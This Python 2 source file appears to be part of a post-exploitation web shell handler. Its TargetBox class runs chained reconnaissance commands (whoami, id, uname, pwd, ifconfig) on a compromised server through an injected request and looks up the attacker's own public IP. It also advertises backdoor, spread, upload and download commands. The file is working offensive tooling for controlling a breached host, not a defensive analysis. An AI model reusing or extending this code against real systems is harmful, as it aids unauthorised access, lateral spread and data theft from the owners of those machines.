from subprocess import Popen, PIPE
from urllib2 import urlopen, URLError
from core.libs.request_handler import make_request
from core.libs.menu import Colors


class TargetBox(object):
    def __init__(self, url=None):
        self.url = url
        self.cmd = 'whoami;'
        self.cmd += 'id;'
        self.cmd += 'uname -a;'
        self.cmd += 'pwd;'
        self.cmd += 'ls -ld `pwd` | awk \'{print $1}\';'
        self.cmd += 'input=`uptime` && if [[ \'$input\' == *day* ]] ; then echo $input | awk \'{print $3 ":" $5}\' | tr -d "," | awk -F ":" \'{print $1 " days, " $2 " hours and " $3 " minutes"}\'; else echo $input | awk \'{print $3}\' | tr -d "," | awk -F ":" \'{print $1 " hours and " $2 " minutes"}\'; fi;'
        self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' ';"

        # Call get_page_source() method then assign it to self.source
        source = make_request.get_page_source(self.cmd)

        self.current_user = source[0]
        self.current_id = source[1]
        self.kernel_info = source[2]
        self.cwd = source[3]
        self.perm_cwd = source[4]
        self.uptime = source[5]
        self.host_ip = ', '.join(source[6:])
        try:
            # Get the attacker's ip address (Thanks @mandreko)
            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            self.local_ip = 'Unknown'

        self.available_commands = "['backdoor', 'banner', 'clear', 'download', 'enum', 'exit', 'history', 'info', 'spread', 'update', 'upload']"

    def get_information(self):
        self.info = \
        '''
        {dashed}
        {red}User{end}        :  {green}{current_user}{end}
        {red}ID{end}          :  {green}{current_id}{end}
        {red}Kernel{end}      :  {green}{kernel_info}{end}
        {red}CWD{end}         :  {green}{cwd}{end}\t{hot}{perm_cwd}{end}
        {red}Uptime{end}      :  {green}{uptime}{end}
        {red}Target's IPs{end}:  {green}{host_ip}{end}
        {red}Our IP{end}      :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute the command locally (on your box){end}
        '''.format(dashed='-' * int(len(self.kernel_info) + 16),
                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                current_user=self.current_user,
                current_id=self.current_id,
                kernel_info=self.kernel_info,
                cwd=self.cwd,
                perm_cwd=self.perm_cwd,
                host_ip=self.host_ip,
                local_ip=self.local_ip,
                uptime=self.uptime,
                available_commands=self.available_commands,)
        print self.info


    # *** Doesn't (yet) work ***
    def update(self):
        import platform
        os = platform.platform()
        if "windows" in os.lower():
            print '{0}\n[!] Coming later (Windows) {1}'.format(Colors.RED, Colors.END)
        else:
            try:
                child = Popen("bash -c 'for x in `whereis git`; do file $x | grep executable; done'", stdout=PIPE).wait()
                if child != 0:
                    cmd = "wget https://github.com/lnxg33k/webhandler/zipball/master -O /tmp/webhandler.zip && unzip /tmp/webhandler.zip -d /tmp/webhandler && mv -f /tmp/webhandler/lnxg33k-webhandler-*/* ./ && rm -rf /tmp/webhandler{/,zip}"
                else:
                    cmd = "git pull"  # git clone git://github.com/lnxg33k/webhandler.git && cd webhandler/
                Popen(cmd, shell=True).wait()
            except:
                print '\n[!] Failed to update'

info = TargetBox()